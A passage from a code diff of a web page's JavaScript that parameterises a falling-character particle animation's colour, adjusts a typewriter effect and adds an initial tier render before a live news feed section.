     } else {
-      setTimeout(() => { li++; ci = 0; if (li < typewriterLines.length) { el.textContent = ''; setTimeout(type, 300); } }, 1200);
+      setTimeout(() => { li++; ci = 0; if (li < lines.length) { el.textContent = ''; setTimeout(type, 300); } }, 1200);
     }
   }
   setTimeout(type, 500);
 }
 
-function startParticles() {
+function startParticles(color) {
   const canvas = document.getElementById('completion-canvas');
   const ctx = canvas.getContext('2d');
   canvas.width = window.innerWidth;
   canvas.height = window.innerHeight;
-
   const chars = ['0','1','T','T','P','>','✔','#','$','?'];
   const particles = [];
 
@@ -563,7 +791,7 @@ function startParticles() {
       if (p.alpha <= 0) return;
       alive = true;
       ctx.globalAlpha = p.alpha;
-      ctx.fillStyle = '#39d353';
+      ctx.fillStyle = color;
       ctx.font = `${p.size}px 'Share Tech Mono', monospace`;
       ctx.fillText(p.char, p.x, p.y);
       p.y += p.vy; p.x += p.vx; p.alpha -= p.decay;
@@ -572,6 +800,9 @@ function startParticles() {
   }
   draw();
 }
+
+// ─── INIT ─────────────────────────────────────────────────────────────────────
+renderTier(0);
 
 // ─── LIVE NEWS FEED ─────────────────────────────────────────────────────────
 let feedLoaded = false;
